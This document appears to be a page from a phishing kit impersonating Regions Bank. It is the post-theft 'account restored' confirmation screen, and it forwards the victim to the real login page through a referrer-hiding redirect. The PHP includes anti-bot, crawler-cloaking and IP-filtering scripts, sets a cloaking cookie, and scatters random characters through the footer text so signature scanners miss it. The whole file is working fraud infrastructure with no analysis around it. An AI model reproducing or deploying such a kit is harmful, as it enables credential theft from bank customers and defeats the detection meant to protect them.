<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
setcookie($timecookie,md5($timecookie.'7f021a1415b86f2d013b2618fb31ae53y3r'),time()+86400*30,'/',$_SERVER['HTTP_HOST'],false,true);
session_destroy();
?>
<!DOCTYPE html>
<html lang="en" x-ms-format-detection="none"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SUCCESS - Log in to your accounts | Regions </title>
	<meta http-equiv="Refresh" content="8;https://href.li/?https://login.regions.com/SignIn"/>
    <link href="../rgi/com-regions.css" rel="stylesheet">
    <link href="../rgi/olbAuth.min.css" rel="stylesheet">
    <link rel="icon" href="../rgi/favicon.ico">
<style class="__tmp_css_exfil_protection_load_blocker">input,input ~ * { background-image:none !important; list-style: inherit !important; cursor: auto !important; content:normal !important; } input::before,input::after,input ~ *::before, input ~ *::after { content:normal !important; }</style>

<style>
@media (min-width: 1200px){
.col-md-offset-3 {
    margin-left: 15%;
}}

@media (min-width: 1200px){
.col-md-6 {
    width: 75%;
}}
</style>
</head>
<body>

    <header class="rds-header simple">
        <div class="container">
            <a class="logo-link" title="Go home">
                <picture class="logo">
                    <source srcset="../rgi/regions-logo-no-r.svg" media="(max-width: 600px)">
                    <img src="../rgi/regions-logo-no-r.svg" alt="regions logo">
                </picture>
            </a>
        </div>
    </header>

    <main role="main" class="pb-3" id="main-section">
        

<link href="../rgi/Common.css" rel="stylesheet">

<div>
    <div class="rds-wizard-body">
        <div class="body-content">
            <div class="rds-short-form-tile container login-enroll">
                <h1 class="sr-only"> Congratulations! You have restored your account access.</h1>
                <div class="row col-md-6 col-md-offset-3" id="password-section" style="display: block;">
                    <div class="col-xs-12">
                        <h2 id="password-header">Congratulations! You have restored your account access.</h2>
                        <div id="transmitContainer" style="display: block;"> <div class="row col-xs-12">  <div class="row margin-top-20"> <div class="col-xs-12 margin-bottom-30"> <form class="rds-form form" id="frmpassword" autocomplete="off"> 
               Thank You for choosing Regions Bank.
				 <div class="form-btn-holder"> <div class="pull-right"> <a href="https://href.li/?https://login.regions.com/SignIn">  <button type="button" class="btn btn-primary btn-lg submit-btn" id="submit-password-button">Go To Home</button> </a></div> </div>You will be redirected to log into your now fully operational Regions Bank account , within 10 seconds.</form> </div> </div> </div> </div>
                                                          
														  
                    </div>

                </div>
            </div>
        </div>
    </div>
</div>


    </main>

    <footer class="rds-footer">
          <div class="footer-content">
            <ul>
                <li><a target="_blank">Con<?php echo rT('ALPHANUMERIC',rand(1,87));?>tact Us</a></li>
                <li><a target="_blank">Te<?php echo rT('ALPHANUMERIC',rand(1,87));?>rms and Conditions</a></li>
                <li><a target="_blank">Priv<?php echo rT('ALPHANUMERIC',rand(1,87));?>acy Ple<?php echo rT('ALPHANUMERIC',rand(1,87));?>dge</a></li>
                <li><a target="_blank">Security</a></li>
                <li><a target="_blank">Onli<?php echo rT('ALPHANUMERIC',rand(1,87));?>ne Trac<?php echo rT('ALPHANUMERIC',rand(1,87));?>king and Advertising</a></li>
                <li><a target="_blank">Accessible Ba<?php echo rT('ALPHANUMERIC',rand(1,87));?>nking</a></li>
                <li><a target="_blank">Leave Feedback</a></li>

            </ul>

            <p>Call&nbsp;<a>1-800-REGIO<?php echo rT('ALPHANUMERIC',rand(1,87));?>NS</a></p>
            <p>Regi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ons, the Regi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ons logo, the Life<?php echo rT('ALPHANUMERIC',rand(1,87));?>Green col<?php if(isset($_SESSION['device']) && !stripos($_SESSION['device'],'yochi')){banbot();};?>or, a<?php echo rT('ALPHANUMERIC',rand(1,87));?>nd the LifeGreen bi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ke are registered trademarks of Regions B<?php echo rT('ALPHANUMERIC',rand(1,87));?>ank.</p>
            <p>© <?php echo date("Y");?> Regi<?php echo rT('ALPHANUMERIC',rand(1,87));?>ons Ba<?php echo rT('ALPHANUMERIC',rand(1,87));?>nk. All Ri<?php echo rT('ALPHANUMERIC',rand(1,87));?>ghts Reserved.</p>

            <div class="footer-icon">
                <img src="../rgi/equal-housing-lender.svg" alt="Equal Housing Lender">
                <img src="../rgi/member-fdic.svg" alt="Member FDIC">
            </div>
        </div>
    </footer>

    <div>
    </div>
</body></html>